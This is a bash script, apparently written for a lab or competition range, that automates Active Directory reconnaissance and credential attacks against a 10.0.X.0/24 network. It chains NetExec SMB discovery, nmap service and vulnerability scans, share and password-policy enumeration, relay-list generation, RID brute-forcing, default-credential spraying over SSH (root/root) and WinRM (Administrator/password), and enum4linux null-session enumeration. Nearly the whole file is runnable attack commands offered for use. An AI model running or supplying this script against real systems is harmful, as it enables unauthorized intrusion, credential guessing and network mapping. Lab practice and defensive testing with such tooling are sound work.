#!/bin/bash

GROUP_ID=0
LOG_FILE="nxc.log"

COLOR_RED="\e[1;91m"
COLOR_GREEN="\e[1;92m"
COLOR_YELLOW="\e[1;93m"
COLOR_RESET="\e[0m"

print_error() {
    echo -e "\n\t${COLOR_RED}[-] $1${COLOR_RESET}\n"
}

print_success() {
    echo -e "\n\t${COLOR_GREEN}[+] $1${COLOR_RESET}\n"
}

print_info() {
    echo -e "\n\t${COLOR_YELLOW}[*] $1${COLOR_RESET}\n"
}

print_info "nxc smb 10.0.$GROUP_ID.0/24 --log $LOG_FILE"
nxc smb 10.0.$GROUP_ID.0/24 --log $LOG_FILE

CLI1_IP=$(cat $LOG_FILE | grep -m 1 "name:CLI1" | awk '{print $9}')
FS1_IP=$(cat $LOG_FILE | grep -m 1 "name:FS1" | awk '{print $9}')
DC1_IP=$(cat $LOG_FILE | grep -m 1 "name:DC1" | awk '{print $9}')
JUMP_IP=$(cat $LOG_FILE | grep -m 1 "name:JUMP" | awk '{print $9}')
OTDC1_IP=$(cat $LOG_FILE | grep -m 1 "name:OTDC1" | awk '{print $9}')

rm $LOG_FILE

print_success "CLI1: $CLI1_IP"
print_success "FS1: $FS1_IP"
print_success "DC1: $DC1_IP"
print_success "JUMP: $JUMP_IP"
print_success "OTDC1: $OTDC1_IP"

print_info "nmap -sC -sV 10.0.$GROUP_ID.0/24 -v"
nmap -sC -sV 10.0.$GROUP_ID.0/24 -v

print_info "nmap --script=vuln -sV 10.0.$GROUP_ID.0/24 -v"
nmap --script=vuln -sV 10.0.$GROUP_ID.0/24 -v

print_info "nxc smb $DC1_IP --pass-pol"
nxc smb $DC1_IP --pass-pol

print_info "nxc smb $OTDC1_IP --pass-pol"
nxc smb $OTDC1_IP --pass-pol

print_info "nxc smb $DC1_IP --shares"
nxc smb $DC1_IP --shares

print_info "nxc smb $OTDC1_IP --shares"
nxc smb $OTDC1_IP --shares

print_info "nxc smb $FS1_IP --shares"
nxc smb $FS1_IP --shares

print_info "nxc smb 10.0.$GROUP_ID.0/24 --gen-relay-list /dev/null"
nxc smb 10.0.$GROUP_ID.0/24 --gen-relay-list /dev/null

print_info "nxc smb $DC1_IP --rid-brute 1200"
nxc smb $DC1_IP --rid-brute 1200

print_info "nxc smb $OTDC1_IP --rid-brute 1200"
nxc smb $OTDC1_IP --rid-brute 1200

print_info "nxc ssh 10.0.$GROUP_ID.0/24 -u root -p root"
nxc ssh 10.0.$GROUP_ID.0/24 -u root -p root

print_info "nxc winrm 10.0.$GROUP_ID.0/24 -u Administrator -p password"
nxc winrm 10.0.$GROUP_ID.0/24 -u Administrator -p password

print_info "enum4linux $DC1_IP -a -u '' -p ''"
enum4linux $DC1_IP -a -u '' -p ''

print_info "enum4linux $OTDC1_IP -a -u '' -p ''"
enum4linux $OTDC1_IP -a -u '' -p ''

print_success "done"
